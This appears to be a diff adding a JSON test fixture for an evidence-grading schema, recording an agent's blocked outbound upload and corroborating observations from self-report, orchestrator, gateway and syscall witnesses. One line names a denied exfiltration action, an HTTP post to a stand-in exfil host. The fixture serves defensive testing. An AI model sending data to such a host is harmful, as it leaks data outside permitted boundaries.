@@ -1,0 +1,53 @@
+{
+  "case_id": "grade-floor-e3-corroborated",
+  "claim": "operationally-conformant",
+  "declared_grade": "E3",
+  "enforcement": {
+    "denials": [
+      {
+        "action": "http.post https://exfil.example.invalid/upload",
+        "policy": "egress-allowlist/v3",
+        "recorded_by": "egress-gateway"
+      }
+    ],
+    "policy_enforced_at_boundary": true
+  },
+  "integrity_claims": {},
+  "integrity_markers": {},
+  "observations": [
+    {
+      "engine": "agent-runtime-log",
+      "observation_directness": "reconstructed",
+      "observation_vantage": "artifact",
+      "relationship": "direct",
+      "source": "self_report",
+      "witness_scope": "SELF"
+    },
+    {
+      "engine": "orchestrator-trace",
+      "observation_directness": "reconstructed",
+      "observation_vantage": "artifact",
+      "relationship": "direct",
+      "source": "framework",
+      "witness_scope": "PEER"
+    },
+    {
+      "engine": "egress-gateway",
+      "observation_directness": "intercepted",
+      "observation_vantage": "substrate",
+      "relationship": "independent",
+      "source": "gateway",
+      "witness_scope": "EXTERNAL"
+    },
+    {
+      "engine": "syscall-supervisor",
+      "observation_directness": "intercepted",
+      "observation_vantage": "substrate",
+      "relationship": "independent",
+      "source": "gateway",
+      "witness_scope": "EXTERNAL"
+    }
+  ],
+  "reconciliation": "agreement",
+  "schema": "evidence-grade-record/v1"
+}
